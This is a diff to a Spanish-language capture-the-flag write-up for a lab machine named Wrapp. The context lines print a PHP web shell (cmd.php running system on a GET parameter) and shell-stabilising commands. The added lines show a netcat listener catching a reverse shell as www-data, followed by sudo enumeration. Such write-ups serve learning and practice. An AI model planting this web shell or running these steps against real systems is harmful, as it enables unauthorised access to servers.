@@ -198,6 +198,7 @@ edward@wrapp:/var/www/html/advanced-search$ cat cmd.php
 	system($_GET['cmd']);
 ?>
 ```
+![reverse-shell]({{'/assets/img/Wrapp/wrapp-reverseshell.png' | relative_url}})
 # Tratamiento TTY
 ```bash
 script /dev/null -c bash
@@ -207,6 +208,13 @@ reset xterm
 ```
 Me conecto como el usuario www-data y con este usuario puedo ejecutar un binario 
 ```bash
+❯ nc -nlvp 443
+listening on [any] 443 ...
+connect to [192.168.2.128] from (UNKNOWN) [192.168.2.23] 59556
+bash: cannot set terminal process group (440): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@wrapp:/var/www/html/advanced-search$ whoami 
+www-data
 www-data@wrapp:/var/www/html/advanced-search$ sudo -l
 sudo -l
 Matching Defaults entries for www-data on wrapp:
